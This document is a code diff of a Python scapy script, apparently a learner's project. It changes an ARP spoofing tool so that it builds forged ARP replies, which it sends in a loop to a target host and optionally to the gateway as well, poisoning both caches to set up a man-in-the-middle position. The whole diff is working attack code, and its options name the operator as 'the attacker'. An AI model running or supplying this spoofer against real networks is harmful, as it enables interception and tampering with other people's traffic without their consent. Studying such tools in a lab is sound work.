@@ -22,17 +22,13 @@ def find_mac_by_ip(ip):
     result = sr1(ARP(op=ARP.who_has, pdst=ip),verbose=0)
     return result.hwsrc #The mac
 
-def send_arp_loop(ipVic,macVic,delay):
-    #i not sure the next raw work
-    response = ARP(op=ARP.is_at,psrc=ipGW, hwsrc=myMac,hwdst=macVic, pdst=ipVic) #scapy fill Automatically layer 2
-    send(response, loop=1, inter=delay)
+def create_arp_response_packet(ipSrc,macSrc,ipDst,macDst):
+    return ARP(op=ARP.is_at, psrc=ipSrc, hwsrc=macSrc, hwdst=macDst, pdst=ipDst)
 
-def arpspoofing(ipVic,delay):
-    macVic=find_mac_by_ip(ipVic)
-    send_arp_loop(ipVic,macVic,delay)
 
 myMac, myIp =find_my_IP_and_MAC()
 ipGW=get_GW()
+
 
 parser = argparse.ArgumentParser(description='Process some arguments.')
 parser.add_argument("-i" ,"--iface", type=str, default='enp0s3',
@@ -41,7 +37,7 @@ parser.add_argument("-s" ,"--src", type=str, default=myIp,
                     help="The address you want for the attacker")
 parser.add_argument("-d" ,"--delay", type=float, default=1,
                     help="Delay (in seconds) between messages")
-parser.add_argument("-gw" ,"--gateway", type=str, default=ipGW,
+parser.add_argument("-gw" ,"--gateway", action='count', default=0,
                     help="should GW be attacked as well")
 #seperate between to types of argument: optional and required
 required = parser.add_argument_group('required arguments')
@@ -52,10 +48,23 @@ required.add_argument("-t" ,"--target", type=str,
 args = parser.parse_args()
 
 def main():
- # print args.target you must write this like this and not args.t
+    macVic=find_mac_by_ip(args.target)
+    macSrc,ipSrc=find_my_IP_and_MAC()
+    #check if the user enter src
+    if ipSrc != args.src:
+        ipSrc=args.src
+        macSrc=find_mac_by_ip(myIp)
+        print 'src change'
+    #if the user -gw
+    if args.gateway>0:
+        macGW=find_mac_by_ip(ipGW)
+        pck=[create_arp_response_packet(args.target,macSrc,ipGW,macGW)] #create a list with one packet
+        pck.append(create_arp_response_packet(ipGW,macSrc,args.target,macVic))
+    else:
+        pck=create_arp_response_packet(ipGW,myMac,args.target,macVic)
 
-    arpspoofing(args.target,args.delay)
- #we need to learn about threads in python and about sniff(filter, prn) in scapy for man in the middle
+    send(pck,inter=args.delay,loop=1)
+
 
 if __name__=="__main__":
     main()
